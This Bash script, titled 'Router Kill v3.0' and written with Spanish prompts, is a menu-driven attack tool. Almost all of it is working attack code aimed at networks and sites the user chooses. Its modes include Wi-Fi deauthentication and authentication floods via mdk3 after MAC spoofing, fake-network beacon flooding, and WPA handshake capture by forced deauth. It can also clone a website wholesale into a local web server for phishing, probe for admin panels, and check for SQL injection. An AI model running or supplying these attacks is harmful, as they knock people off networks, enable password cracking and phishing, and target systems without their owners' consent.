
#!/bin/bash

#Author: Facu Salgado https://github.com/bytesalgado/
#instagram: @facukaku021
#twitter: @facukaku021

# trap ctrl-c and call ctrl_c()
trap ctrl_c INT

s="s"


#Colores lo q tanto te molestaba crack xd

blanco="\033[1;37m"
violeta="\033[0;35m"
rojo="\033[1;31m"
verde="\033[1;32m"
amarillo="\033[1;33m"
violeta2="\033[0;35m"
azul="\033[1;34m"
nc="\e[0m"
mon="mon"


function ctrl_c() {
echo
echo -e "$amarillo[*]$blanco  Presionaste la tecla CTRL + C.. saliendo del programa..."
sleep 2
checkmode=$(ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d')
#Verification mode monitor and exit
if [[ $checkmode == *wlan0* ]] 
then
airmon-ng stop wlan0
echo -e "$amarillo[*]$blanco  Deteniendo modo monitor"
sleep 4
fi

if [[ $checkmode == *eth0* ]] 
then
airmon-ng stop eth0
echo -e "$amarillo[*]$blanco  Deteniendo modo monitor..."
sleep 2
fi

if [[ $checkmode == *wlan1* ]] 
then
airmon-ng stop wlan1
echo -e "$verde[+]$blanco  Modo monitor detenido..."
sleep 4
echo
fi
clear
echo -e "$amarillo[*]$blanco  Gracias por utilizar nuestro script.. saliendo.."
sleep 3
exit

}


case `dpkg --print-architecture` in
aarch64)
echo -e "$rojo(error)$azul el script solo soporta arquitectura$rojo AMD 64$azul Sistemas debian y deribados"
exit
;;
arm)
echo -e "$rojo(error)$azul el script solo soporta arquitectura$rojo AMD 64$azul Sistemas debian y deribados"
exit
;;
armhf)
echo -e "$rojo(error)$azul el script solo soporta arquitectura$rojo AMD 64$azul Sistemas debian y deribados"
exit
;;

i*86)
echo -e "$rojo(error)$azul el script solo soporta arquitectura$rojo AMD 64$azul Sistemas debian y deribados"
exit
;;
x86_64)
echo -e "$rojo(error)$azul el script solo soporta arquitectura$rojo AMD 64$azul Sistemas debian y deribados"
exit
;;
esac




#Opciones menu

a=$'\033[1;37mDeuth Atack\e[01;32m' 
b=$'\033[1;37mFake Point\e[01;32m'
c=$'\033[1;37mAuth Atttack\e[01;32m'
d=$'\033[1;37mStop monitor mode\e[01;32m'
e=$'\033[1;37mCapture Handshake\e[01;32m'
new2=$'\033[1;37mWeb Attacks\e[01;32m'
update=$'\033[1;37mUpdate Program\e[01;32m'
f=$'\033[1;37mexit Program\e[01;32m'


#opciones MENU

w1=$'\e[1;35mClonar sitio\e[01;32m'
w2=$'\e[1;35mFind panel\e[01;32m'
w3=$'\e[1;35mCheck SQLI\e[01;32m'
w4=$'\e[1;35mBack menu\e[01;32m'


wyes=$'\e[1;35mClonar Index\e[01;32m'
wno=$'\e[1;35mClonar web entera\e[01;32m'
wback=$'\e[1;35mBack Menu\e[01;32m'

#directory verification
directory=$(pwd)

#verificacion de Dependencias..

#root privilegies
if [[ $EUID -ne 0 ]]; then	

echo -e "$nc($violeta2*$nc)$rojo ERROR:$azul No eres usuario$rojo root"		
exit 1
fi
clear
#airmon-ng
if which airmon-ng >/dev/null; then
sleep 0.25
echo -e "$azul(airmon-ng)$verde Instalado correctamente."
else
sleep 0.25
echo -e "$azul(airmon-ng)$verde NO instalado.."
sleep 1
echo -e "$nc instala escribiendo$verde apt-get install aircrack-ng -y"
sleep 0.25
exit 1
fi

if which airodump-ng >/dev/null; then
sleep 0.25
echo -e "$azul(airodump-ng)$verde Instalado correctamente."
else
sleep 0.25
echo -e "$azul(airodump-ng)$verde no Instalado"
sleep 1
echo -e "$nc instala escribiendo$verde apt-get install aircrack-ng -y"
exit 1
fi

if which mdk3 >/dev/null; then
sleep 0.25
echo -e "$azul(MDK3)$verde Instalado correctamente."
sleep 0.25
else
sleep 0.25
echo -e "$azul(MDK3)$verde No instalado."
sleep 1
echo -e "$nc instala escribiendo$verde apt-get install mdk3 -y"
exit 1
fi


if which macchanger >/dev/null; then
sleep 0.25
echo -e "$azul(Macchanger)$verde Instalado correctamente."
sleep 0.25
else
sleep 0.25
echo -e "$azul(Macchanger)$verde no instalado."
sleep 1
echo -e "$nc instala escribiendo$verde apt-get install macchanger -y"
exit 1
fi

if which toilet >/dev/null; then
sleep 1
echo -e "$azul(Toilet)$verde Instalado correctamente."
else
sleep 1
echo -e "$azul(TOilet)$verde No instalado"
sleep 1
echo -e "$nc instala escribiendo$verde apt-get install toilet -y"
sleep 1
exit 1
fi

#mensaje y logo bienvenida
clear
toilet --filter border Router Kill | lolcat
echo
echo -e "$violeta2(*)$azul Router Kill$rojo v3.0$azul"
sleep 2
echo -e "$violeta2(*)$azul Script creado por$rojo Facu Salgado"
sleep 1
echo -e "$violeta2(*)$azul Regalanos una estrella en github$verde"
echo

export PS3=$'\033[1;33m(*)\e[01;32m Elige una Opcion:\e[01;33m '




function verificarsqli(){
sleep 1
echo -e "$violeta2(*)$azul Esta funcion le permitira saber si un sitio es vulnerable a$rojo SQL Injection"
sleep 3
echo
echo
echo -e "$violeta2(*)$azul Debe ingresar la pagina de la siguiente manera:"
echo -e "$violeta2(*)$azul You need to enter the page as follows:"
sleep 3
echo -e "$violeta2(*)$azul Ejemplo:$rojo dominio.com$violeta2/pagina.php?parametro=1"
echo -e "$violeta2(*)$azul Example:$rojo domain.com$violeta2/page.php?parameter=1"
sleep 3
echo
echo
echo -e "$violeta2(*)$azul Example:$rojo domain.com$violeta2/login.php?id=1"
echo -e "$violeta2(*)$azul Ejemplo:$rojo domain.com$violeta2/login.php?id=1"
sleep 2
echo
echo
printf "\e[01;35m Escriba la pagina:\e[01;32m "
read page
echo
echo -e "$purpura(*)$blue verificando$rojo SQLI VULNERABILITY$azul Please Wait.."
sleep 4


#solicitud GET al sitio
dork="'"
i2=0
sqli=$(curl -H "Accept: application/xml" -H "Content-Type: application/xml" --silent -X GET "$page$dork")

#Verification fallas SQL en la consulta GET

if  echo "$sqli" | grep -q -i "You have an error in your SQL syntax"; then
i2=$((i2+1))
fi

if  echo "$sqli" | grep -q -i "mysql_fetch_array"; then
i2=$((i2+1))
fi

if  echo "$sqli" | grep -q -i "mysqli_fetch_array"; then
i2=$((i2+1))
fi

if  echo "$sqli" | grep -q -i "mysql_num_rows"; then
i2=$((i2+1))
fi

if  echo "$sqli" | grep -q -i "Warning: mysq"; then
i2=$((i2+1))
fi

#Verification Variable C si es mayor a 0 significa que es vulnerable

if [[ $i2 > 0 ]]
then
echo
echo
echo -e "$azul Pagina$violeta2 $page$verde Is vulnerable a$azul SQLI Injection$verde"
else
echo
echo
echo -e "$azul Pagina$violeta2 $page$rojo Is not vulnerable a$azul SQLI Injection$verde"
sleep 2
fi
menu_principal
}





function obtenerpanel(){

#Verifica el archivo de directorios para el ataque

if [ -e $directory/directorys.txt ]
then
echo
else
curl https://raw.githubusercontent.com/byteSalgado/router-kill/master/directorys.txt > $directory/directorys.txt
fi
echo -e "$violeta2(*)$azul Debe ingresar la pagina de la siguiente manera:"
echo -e "$violeta2(*)$azul You need to enter the page as follows:"
sleep 3
echo
echo
echo -e "$violeta2(*)$azul Ejemplo:$rojo dominio.com"
echo -e "$violeta2(*)$azul Example:$rojo domain.com"
sleep 3
echo
echo
echo -e "$violeta2(*)$azul No debe incluir subdirectorios como por ejemplo:$rojo dominio.com/hola/"
echo -e "$violeta2(*)$azul It should not include subdirectories such as:$rojo domain.com/hello/"
sleep 4
echo
echo
echo -e "$violeta2(*)$azul Tampoco debe incluir ninguna barra diagonal$rojo(/)"
echo -e "$violeta2(*)$azul It also must not include any forward slashes$rojo(/)"
sleep 4
echo
echo
printf "\e[01;35m Escriba la pagina/domain:\e[01;32m "
read pagina

while read line
do


#obtiene codigo de respuesta y lo guarda en la variable result

result=$(curl -s -I "$pagina/$line" | head -n 1 | awk '{print $2}')

#inicia variable en 0
i=0

#si el codigo respuesta es 200 o 302 le suma +1 a la variable

if [[ "$result" == "200" ]]; then
i=$((i+1))
elif [[ "$result" == "302" ]]; then
i=$((i+1))
fi

#si la variable es mayor a 0 significa que el panel fue encontrado.

if [[ $i > 0 ]]
then
echo -e "$azul Pagina$rojo $pagina$violeta2/$line$verde Found"
sleep 2
echo
echo -e "$azul Posible panel de la pagina: $verde$pagina/$line$verde"
sleep 3
echo
echo
break
else
echo -e "$azul Pagina$rojo $pagina$violeta2/$line$rojo Not Found"
fi
done < $directory/directorys.txt
echo -e "$violeta2(*)$azul volviendo al menu principal.."
sleep 3
menu_principal
}

function webmenu(){


select webmenu in "$w1" "$w2" "$w3" "$w4";
do
case $webmenu in
$w1)
echo
echo
echo -e "$violeta2(*)$azul Verificando estado$verde apache2"
sleep 2
#check Apache
if which apache2 >/dev/null; then
sleep 1
echo -e "$azul(apache2)$verde Instalado"
else
sleep 1
echo -e "$azul(apache2)$verde No instalado"
sleep 2
echo -e "$azul(apache2)$verde Instalando apache2 en 5 segundos.."
sleep 5
apt-get install apache2 -y
clear
fi
echo -e "$violeta2(*)$azul A continuacion escoga si desea clonar el index o el sitio entero..$verde"
sleep 3
echo
echo
select tipoclone in "$wyes" "$wno" "$wback";
do 
case $tipoclone in
$wyes)
if [ -e $directory/index.html ]
then
rm $directory/index.html
fi
echo
echo
echo -e "$violeta2(*)$azul A continuacion ingrese el sitio web sin subdominios"
sleep 3
echo -e "$violeta2(*)$azul Ejemplo:$rojo mipagina.com"
sleep 2
printf "\e[01;35m Escriba el sitio/domain:\e[01;32m "
read targetwebsite
echo -e "$violeta2(*)$azul Clonando Website:$rojo $targetwebsite$azul Please wait.."
sleep 3
curl --silent $targetwebsite >> $directory/index.html
mv $directory/index.html /var/www/html/
sleep 1
echo -e "$violeta2(*)$azul Sitio web:$rojo $targetwebsite$azul Clonado exitosamente..."
sleep 3
echo -e "$violeta2(*)$azul para ver el sitio dirigase a su navegador y coloque$violeta2 http://localhost$verde"
sleep 3
echo -e "$violeta2(*)$azul Volviendo al menu principal..$verde"
sleep 2
menu_principal
;;

$wno)
rm -rf /var/www/html/*
sleep 1
echo -e "$violeta2(*)$azul esta opcion clonara el sitio web entero de RAIZ.."
sleep 3
echo
echo
echo -e "$violeta2(*)$azul A continuacion ingrese el sitio web sin subdominios"
sleep 3
echo -e "$violeta2(*)$azul Ejemplo:$rojo mipagina.com"
sleep 2
printf "\e[01;35m Escriba el sitio/domain:\e[01;32m "
read targetwebsite2
echo -e "$violeta2(*)$azul Clonando Website:$rojo $targetwebsite2$azul Please wait.."
sleep 3
cd /var/www/html
wget -q --header="Accept: text/html" --user-agent="Mozilla/5.0 (X11; Linux amd64; rv:32.0b4) Gecko/20140804164216 ArchLinux KDE Firefox/32.0b4" --referer=http://www.google.com -r $targetwebsite2 -e robots=off -k
cd $directory
echo -e "$violeta2(*)$azul sitio web$rojo $targetwebsite2$azul clonado exitosamente.."
sleep 3
echo -e "$violeta2(*)$azul para ver el sitio dirigase a su navegador y coloque$violeta2 http://localhost$verde"
sleep 3
echo -e "$violeta2(*)$azul Volviendo al menu principal..$verde"
sleep 2
menu_principal

;;

$wback)
echo -e "$violeta2(*)$azul Volviendo al menu principal..$verde"
sleep 3
menu_principal
;;
*)
echo -e "$rojo(ERROR)$azul $REPLY $verde Opcion no valida $verde"
;;
esac
done
;;

$w2)
echo -e "$violeta2(*)$azul Please wait..$verde"
sleep 3
obtenerpanel
;;

$w3)

echo -e "$violeta2(*)$azul Please wait..$verde"
sleep 3
verificarsqli
;;
$w4) 
echo -e "$violeta2(*)$azul Volviendo al menu principal..$verde Please wait.."
sleep 3
menu_principal
;;
*)
echo -e "$rojo(ERROR)$azul $REPLY $verde Opcion no valida $verde"
;;
esac
done
}


















#menu principal

function menu_principal(){
echo
echo
select menu in "$a" "$b" "$c" "$d" "$e" "$new2" "$update" "$f";
do
case $menu in 

$a)
echo
echo -e "$amarillo[*]$blanco  Este Ataque desautenticara todos los clientes dentro de la red"
sleep 4
echo
echo -e "$amarillo[*]$blanco le mostraremos sus interfaces de red disponibles.."
sleep 4
echo
echo
sleep 1

mapfile -t interfaces < <(iw dev | awk '$1=="Interface"{print $2}')

if [ "${#interfaces[@]}" -eq 0 ]; then
    echo -e  "$rojo[-]$blanco No se encontraron interfaces inalámbricas.. conecte un adaptador USB WIFI"
    sleep 2
    return
fi

while true; do
    clear
    echo -e "\n$amarillo Interfaces inalámbricas disponibles:\n"

    i=1
    for iface in "${interfaces[@]}"; do
        echo -e  "$verde $i) $blanco $iface"
        ((i++))
    done

    echo
    printf "\e[1;37m Selecciona el número de la interfaz: \e[1;32m: " 
    read iface_choice

    # Validación
    if ! [[ "$iface_choice" =~ ^[0-9]+$ ]]; then
        echo -e "$rojo[-]$blanco Debe ingresar un número"
        sleep 2
        continue
    fi

    if [ "$iface_choice" -lt 1 ] || [ "$iface_choice" -gt "${#interfaces[@]}" ]; then
        echo -e "$rojo[-]$blanco Selección inválida$verde"
        sleep 2
        continue
    fi

    # Si llega acá, es válido
    interface="${interfaces[$((iface_choice-1))]}"
    echo
    echo -e "$verde[+]$blanco Interfaz seleccionada:$verde $interface"
    sleep 3
    echo
    break
done

#cambio de dirección mac
echo -e "$verde[+]$blanco A continuacion daremos de baja tu interfaz para falsificar tu MAC"
sleep 3
ifconfig $interface down
echo
echo -e "$verde[+]$blanco Falsificando tu MAC!!"
sleep 3
macchanger -r $interface
ifconfig $interface up
echo
echo -e "$verde[+]$blanco TU direccion MAC fue falsificada correctamente!!"
sleep 3
echo -e "$amarillo[*]$blanco iniciando modo monitor... aguarde.."
sleep 4
airmon-ng start $interface
pkill dhclient && pkill wpa_supplicant
echo -e "$verde[+]$blanco  Modo monitor iniciado correctamente.."
sleep 5
clear
sleep 2
echo -e "$amarillo[*]$blanco iniciando escaneo de redes disponibles.."
sleep 4
echo
echo -e "$amarillo[*]$blanco Espere unos 15 segundos despues que inicie el escaneo..."
sleep 9

dump_prefix="/tmp/scan_$(date +%s)"
airodump-ng --write "$dump_prefix" --output-format csv "$interface" &
airodump_pid=$!

sleep 12
kill $airodump_pid


csv_file="${dump_prefix}-01.csv"

mapfile -t networks < <(
    awk -F',' '
    BEGIN { found=0 }
    /^BSSID,/ { found=1; next }
    found && $1 != "" && $14 != "" {
        gsub(/^[ \t]+|[ \t]+$/, "", $1)
        gsub(/^[ \t]+|[ \t]+$/, "", $4)
        gsub(/^[ \t]+|[ \t]+$/, "", $6)
        gsub(/^[ \t]+|[ \t]+$/, "", $14)
        printf "%s|%s|%s|%s\n", $1, $4, $6, $14
    }
    ' "$csv_file"
)

if [ "${#networks[@]}" -eq 0 ]; then
    echo -e "$rojo[-]$blanco No se encontraron redes en el escaneo"
    sleep 2
    return
fi

while true; do
    clear
    echo -e "$amarillo Redes detectadas:$amarillo\n"

    i=1
    for net in "${networks[@]}"; do
        IFS='|' read -r nbssid nch nenc nessid <<< "$net"
        printf "$blanco%d) %-20s$blanco  CH: $amarillo%-3s$blanco  %-6s$amarillo  %s$blanco\n" "$i" "$nbssid" "$nch" "$nenc" "$nessid"
        ((i++))
    done

    echo
    read -p "Seleccione el número de la red: " net_choice

    if ! [[ "$net_choice" =~ ^[0-9]+$ ]]; then
        echo -e "$rojo[-]$blanco Debe ingresar un número"
        sleep 2
        continue
    fi

    if [ "$net_choice" -lt 1 ] || [ "$net_choice" -gt "${#networks[@]}" ]; then
        echo -e "$rojo[-]$blanco Selección inválida"
        sleep 2
        continue
    fi

    selected="${networks[$((net_choice-1))]}"
    IFS='|' read -r bssid ch enc essid <<< "$selected"

    echo
    echo -e "$verde[+]$blanco Red seleccionada:"
    echo -e "    BSSID :$amarillo $bssid $blanco"
    echo -e "    Canal :$amarillo $ch $blanco"
    echo -e "    ENC   :$amarillo $enc $blanco"
    echo -e "    ESSID :$amarillo $essid $blanco"
    sleep 2
    break
done
echo
echo
while true; do
    printf "\033[1;37mAñade duración del ataque en segundos: "
    read -r sec

    if [[ "$sec" =~ ^[1-9][0-9]*$ ]]; then
        break
    else
        echo -e "$rojo[-]$blanco Debe ser un numero mayor a 0"
    fi
done


# Aviso si es WPA3 / PMF (solo muestra mensaje, no corta nada)
if [[ "${enc^^}" == *"WPA3"* ]]; then
    echo
    echo -e "$rojo[-]$blanco Esta red esta utilizando WPA3/PMF, el ataque puede resultar sin ningun efecto.."
    sleep 5
    echo
fi


tmp_bssid_file="/tmp/mdk3_bssid.txt"
echo "$bssid" > "$tmp_bssid_file"

echo -e "$amarillo[*]$blanco El ataque sera realizado al BSSID:$amarillo $bssid $blanco En el Canal:$amarillo $ch"
sleep 2
echo
echo -e "$amarillo[*]$blanco El ataque iniciara en 5 segundos.."
sleep 1
echo "4 segundos.."
sleep 1
echo "3 segundos.."
sleep 1
echo "2 segundos.."
sleep 1
echo "1 segundo"
sleep 1
echo
echo -e "$verde[+]$blanco Ataque iniciado.. tiempo restante de ataque: $amarillo $sec $blanco segundos"
timeout --foreground $sec$s mdk3 $interface d -b $tmp_bssid_file -c $ch
echo -e "$verde[+]$blanco Ataque terminado exitosamente.."
rm -f "$tmp_bssid_file"
sleep 2
echo
echo -e "$amarillo[*]$blanco Deteniendo modo monitor..."
sleep 4
airmon-ng stop $interface
clear
echo -e "$amarillo[*]$blanco volviendo al menu principal en 5 segundos"
sleep 5
clear
toilet --filter border Router Kill | lolcat
echo
sleep 3
echo
menu_principal
;;

$b)

clear
sleep 1
echo -e "$amarillo[*]$blanco Este ataque creara falsas redes Wifi..."
sleep 4
echo
echo
echo -e "$amarillo[*]$blanco Detectando interfaces..."
sleep 3


mapfile -t interfaces < <(iw dev | awk '$1=="Interface"{print $2}')

if [ "${#interfaces[@]}" -eq 0 ]; then
    echo -e  "$rojo[-]$blanco No se encontraron interfaces inalámbricas.. conecte un adaptador USB WIFI"
    sleep 2
    return
fi

while true; do
    clear
    echo -e "\n$amarillo Interfaces inalámbricas disponibles:\n"

    i=1
    for iface in "${interfaces[@]}"; do
        echo -e  "$verde $i) $blanco $iface"
        ((i++))
    done

    echo
    printf "\e[1;37m Selecciona el número de la interfaz: \e[1;32m: " 
    read iface_choice

    # Validación
    if ! [[ "$iface_choice" =~ ^[0-9]+$ ]]; then
        echo -e "$rojo[-]$blanco Debe ingresar un número"
        sleep 2
        continue
    fi

    if [ "$iface_choice" -lt 1 ] || [ "$iface_choice" -gt "${#interfaces[@]}" ]; then
        echo -e "$rojo[-]$blanco Selección inválida$verde"
        sleep 2
        continue
    fi

    # Si llega acá, es válido
    interface="${interfaces[$((iface_choice-1))]}"
    echo
    echo -e "$verde[+]$blanco Interfaz seleccionada:$verde $interface"
    sleep 3
    echo
    break
done

sleep 1
echo -e "$amarillo[*]$blanco Iniciando modo monitor... aguarde.."
sleep 2
airmon-ng start $interface
pkill dhclient && pkill wpa_supplicant
clear
echo
echo -e "$verde[+]$blanco Modo monitor iniciado correctamente.."
echo
sleep 3
printf "\033[1;37mEscribe un nombre base para la red WIFI:\033[1;32m "
read -r base_ssid
sleep 2
echo
while true; do
    printf "\r\033[K"
    read -rp $'\033[1;37mEscribe cantidad de redes a generar (1-50): \033[1;32m' qty

    # Validar número
    if [[ ! "$qty" =~ ^[0-9]+$ ]]; then
        printf "\r\033[K$rojo[-]$blanco Debe ser un numero entero valido."
        sleep 3.5
        continue
    fi

    # Validar rango
    if (( qty < 1 || qty > 50 )); then
        printf "\r\033[K$rojo[-]$blanco El numero debe estar entre 1 y 50."
        sleep 3.5
        continue
    fi

    # Limpiar línea y salir
    printf "\r\033[K"
    break
done
echo
sleep 2
while true; do
    printf "\033[1;37mAñade duración del ataque en segundos:\033[1;32m "
    read -r sec

    if [[ "$sec" =~ ^[1-9][0-9]*$ ]]; then
        break
    else
        echo -e "$rojo[-]$blanco Debe ser un numero mayor a 0"
    fi
done

tmp_ssid_file="/tmp/mdk3_custom_ssid.txt"
> "$tmp_ssid_file"   # vaciar archivo

for ((i=1; i<=qty; i++)); do
    echo "$base_ssid $i"        >> "$tmp_ssid_file"
    echo "$base_ssid-$i"       >> "$tmp_ssid_file"
    echo "${base_ssid}_EXT_$i" >> "$tmp_ssid_file"
done

sleep 3
echo
echo -e "$amarillo[*]$blanco El ataque iniciara en 5 segundos.."
sleep 1
echo
echo "4 segundos"
sleep 1
echo "3 segundos"
sleep 1
echo "2 segundos"
sleep 1
echo "1 segundos"
sleep 1
echo
echo -e "$verde[+]$blanco Ataque Iniciado.. tiempo restante de ataque:$amarillo $sec$blanco Segundos $nc"
timeout --foreground ${sec}s mdk3 $interface b -f "$tmp_ssid_file"

echo
echo -e "$verde[+]$blanco Ataque finalizado.. $nc"
sleep 2
echo -e "$rojo[-]$blanco Borrando archivos temporales"
sleep 2
rm -f "$tmp_ssid_file"
echo
echo -e "$verde[+]$blanco deteniendo modo monitor...$nc"
sleep 2
airmon-ng stop $interface
clear
echo -e "$amarillo[*]$blanco volviendo al menu principal en 5 segundos.."
sleep 5
clear
toilet --filter border Router Kill | lolcat
echo
sleep 3
echo
menu_principal
;;


$c)
clear
sleep 3
echo -e "$amarillo[*]$blanco Este ataque creara un flood de intentos de conexion al router..."
sleep 3
echo
echo -e "$amarillo[*]$blanco detectando interfaces disponibles...."
sleep 3
mapfile -t interfaces < <(iw dev | awk '$1=="Interface"{print $2}')

if [ "${#interfaces[@]}" -eq 0 ]; then
    echo -e  "$rojo[-]$blanco No se encontraron interfaces inalámbricas.. conecte un adaptador USB WIFI"
    sleep 2
    return
fi

while true; do
    clear
    echo -e "\n$amarillo Interfaces inalámbricas disponibles:\n"

    i=1
    for iface in "${interfaces[@]}"; do
        echo -e  "$verde $i) $blanco $iface"
        ((i++))
    done

    echo
    printf "\e[1;37m Selecciona el número de la interfaz: \e[1;32m: " 
    read iface_choice

    # Validación
    if ! [[ "$iface_choice" =~ ^[0-9]+$ ]]; then
        echo -e "$rojo[-]$blanco Debe ingresar un número"
        sleep 2
        continue
    fi

    if [ "$iface_choice" -lt 1 ] || [ "$iface_choice" -gt "${#interfaces[@]}" ]; then
        echo -e "$rojo[-]$blanco Selección inválida$verde"
        sleep 2
        continue
    fi

    # Si llega acá, es válido
    interface="${interfaces[$((iface_choice-1))]}"
    echo
    echo -e "$verde[+]$blanco Interfaz seleccionada:$verde $interface"
    sleep 3
    echo
    break
done

airmon-ng start $interface
pkill dhclient && pkill wpa_supplicant
clear
sleep 1
echo -e "$verde[+]$blanco modo monitor iniciado correctamente"
sleep 3
echo
echo -e "$amarillo[*]$blanco escaneando redes disponibles..."
sleep 2
echo
echo -e "$amarillo[*] $blanco espera 20 segundos despues del escaneo.."
sleep 10
timeout --foreground 20s airodump-ng $interface

dump_prefix="/tmp/scan_$(date +%s)"
airodump-ng --write "$dump_prefix" --output-format csv "$interface" &
airodump_pid=$!

sleep 12
kill $airodump_pid


csv_file="${dump_prefix}-01.csv"

mapfile -t networks < <(
    awk -F',' '
    BEGIN { found=0 }
    /^BSSID,/ { found=1; next }
    found && $1 != "" && $14 != "" {
        gsub(/^[ \t]+|[ \t]+$/, "", $1)
        gsub(/^[ \t]+|[ \t]+$/, "", $4)
        gsub(/^[ \t]+|[ \t]+$/, "", $6)
        gsub(/^[ \t]+|[ \t]+$/, "", $14)
        printf "%s|%s|%s|%s\n", $1, $4, $6, $14
    }
    ' "$csv_file"
)

if [ "${#networks[@]}" -eq 0 ]; then
    echo -e "$rojo[-]$blanco No se encontraron redes en el escaneo"
    sleep 2
    return
fi

while true; do
    clear
    echo -e "$amarillo Redes detectadas:$amarillo\n"

    i=1
    for net in "${networks[@]}"; do
        IFS='|' read -r nbssid nch nenc nessid <<< "$net"
        printf "$blanco%d) %-20s$blanco  CH: $amarillo%-3s$blanco  %-6s$amarillo  %s$blanco\n" "$i" "$nbssid" "$nch" "$nenc" "$nessid"
        ((i++))
    done

    echo
    read -p "Seleccione el número de la red: " net_choice

    if ! [[ "$net_choice" =~ ^[0-9]+$ ]]; then
        echo -e "$rojo[-]$blanco Debe ingresar un número"
        sleep 2
        continue
    fi

    if [ "$net_choice" -lt 1 ] || [ "$net_choice" -gt "${#networks[@]}" ]; then
        echo -e "$rojo[-]$blanco Selección inválida"
        sleep 2
        continue
    fi

    selected="${networks[$((net_choice-1))]}"
    IFS='|' read -r bssid ch enc essid <<< "$selected"

    echo
    echo -e "$verde[+]$blanco Red seleccionada:"
    echo -e "    BSSID :$amarillo $bssid $blanco"
    echo -e "    Canal :$amarillo $ch $blanco"
    echo -e "    ENC   :$amarillo $enc $blanco"
    echo -e "    ESSID :$amarillo $essid $blanco"
    sleep 2
    break
done
echo
echo
printf "\e[1;37mIntroduce el tiempo de ataque en Segundos:\e[01;32m "
read sec
tmp_bssid_file="/tmp/mdk3_bssid.txt"
echo "$bssid" > "$tmp_bssid_file"

sleep 2
echo -e "$amarillo[*]$blanco el ataque comenzara en 5 segundos"
sleep 1
echo "4 segundos"
sleep 1
echo "3 segundos"
sleep 1
echo "2 segundos"
sleep 1
echo "1 segundos"
sleep 1
echo -e "$verde[+]$blanco ataque iniciado.. tiempo restante$amarillo $sec $blanco segundos"
sleep 2
timeout --foreground $sec$s mdk3 $interface a -a $bssid
echo -e "$verde[+]$blanco ataque finalizado..."
sleep 4
echo
echo -e "$amarillo[*]$blanco Deteniendo modo monitor...."
sleep 4
airmon-ng stop $interface
clear
echo -e "$verde[*]$blanco volviendo al menu principal en 5 segundos..."
sleep 5
clear 
toilet --filter border Router Kill | lolcat
echo
sleep 2
echo
menu_principal



;;



$d)

checkmode=$(ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d')

#Verification mode monitor and exit

if [[ $checkmode == *wlan0mon* ]] 
then
airmon-ng stop wlan0mon
echo -e "$nc($azul*$nc)$verde Modo monitor detenido..$nc"
sleep 1
fi

if [[ $checkmode == *eth0mon* ]] 
then
airmon-ng stop eth0mon
echo -e "$nc($azul*$nc)$verde Modo monitor detenido..$nc"
sleep 1
fi

if [[ $checkmode == *wlan1mon* ]] 
then
airmon-ng stop wlan1mon
echo -e "$nc($azul*$nc)$verde Modo monitor detenido..$nc"
sleep 1
fi
echo -e "$nc($azul*$nc)$verde Volviendo al menu principal$verde"
sleep 2
menu_principal

;;

$e)

echo -e "$nc($azul*$nc)$verde Este Ataque capturara un handshake de una RED"
sleep 2
echo -e "$nc($azul*$nc)$verde Les mostraremos sus interfaces disponibles"
sleep 2
ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d'
sleep 1
echo
printf "\e[01;35m Escriba su interfaz:\e[01;32m "
read interface
echo -e "$nc($azul*$nc)$verde Ahora iniciaremos el modo monitor en tu interfaz"
sleep 2
airmon-ng start $interface
pkill dhclient && pkill wpa_supplicant
echo -e "$nc($azul*$nc)$verde Modo monitor iniciado correctamente"
sleep 2
echo -e "$nc($azul*$nc)$verde Ahora haremos un analisis de las redes disponibles"
sleep 2
echo -e "$nc($azul*$nc)$verde AVISO: Espera 25 segundos$verde cuando inicie el analisis"
sleep 9
timeout --foreground 25s airodump-ng $interface$mon
echo
echo
printf "\e[01;35m Añade el BSSID victima:\e[01;32m "
read bssid
sleep 2
printf "\e[01;35m Añade el canal de la red (CH):\e[01;32m "
read ch
sleep 2
printf "\e[01;35m Añade el un nombre para guardar el txt:\e[01;32m "
read doc
echo $bssid > $doc
sleep 2
read -p "Añade la duracion del ataque(deauth) en segundos ➜ " sec
sleep 2
echo -e "$nc($azul*$nc)$verde El ataque sera realizado al BSSID:$azul $bssid $verde En el Canal: $ch"
sleep 2
echo -e "$nc($azul*$nc)$verde el ataque Iniciara en 5 segundos.."
sleep 1
echo "4 segundos.."
sleep 1
echo "3 segundos.."
sleep 1
echo "2 segundos.."
sleep 1
echo "1 segundo"
sleep 1
timeout --foreground 2s airodump-ng --bssid $bssid -c $ch $interface$mon
echo -e "$nc($azul*$nc)$verde ejecutando xterm en 5 segundos.."
sleep 5
timeout --foreground 30s xterm -hold -e "aireplay-ng --deauth 0 -a $bssid $interface$mon" & 
timeout --foreground 60s xterm -hold -e "airodump-ng -w handshake/$doc.cap --bssid $bssid -c $ch $interface$mon" 
echo -e "$nc($azul*$nc)$verde El handshake fue capturado exitosamente PATH:$azul handshake/$doc.cap"
sleep 4
echo -e "$nc($azul*$nc)$verde el ataque ha Finalizado..$amarillo"
sleep 2
echo -e "$nc($azul*$nc)$verde Deteniendo modo monitor$verde"
sleep 2
airmon-ng stop $interface$mon
menu_principal



;;

$new2)
echo -e "$nc($azul*$nc)$verde Please wait.."
sleep 3
echo
echo
webmenu

;;

$update)

echo -e "$nc($azul*$nc)$verde Comprobando estado internet.. please wait.."
sleep 4
if ping -q -w 1 -c 1 google.com > /dev/null; then
echo -e "$nc($azul*$nc)$verde Actualizando programa.. en 5 segundos.."
sleep 5 
if [ -e $directory/routerkill.sh ]
then
rm $directory/routerkill.sh
fi
curl https://raw.githubusercontent.com/byteSalgado/router-kill/master/routerkill.sh > routerkill.sh
echo -e "$nc($azul*$nc)$verde Programa Actualizado.. vuelva a ejecutarlo nuevamente..$nc"
sleep 2
exit                                                                                                                                                                
else 
echo
echo
echo -e "$nc($azul*$nc)$verde Internet no disponible.. saliendo..$nc" 
exit                                                                                                                                                              
fi       
;;
$f)

checkmode=$(ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d')

#Verification mode monitor and exit

if [[ $checkmode == *wlan0mon* ]] 
then
airmon-ng stop wlan0mon
echo -e "$nc($azul*$nc)$verde Modo monitor detenido..$nc"
sleep 1
fi

if [[ $checkmode == *eth0mon* ]] 
then
airmon-ng stop eth0mon
echo -e "$nc($azul*$nc)$verde Modo monitor detenido..$nc"
sleep 3
fi

if [[ $checkmode == *wlan1mon* ]] 
then
airmon-ng stop wlan1mon
echo -e "$nc($azul*$nc)$verde Modo monitor detenido..$nc"
sleep 4
fi
echo -e "$nc($azul*$nc)$verde Gracias por usar nuestro Script $azul by Facu Salgado..$nc"
sleep 2
exit
;;


*)
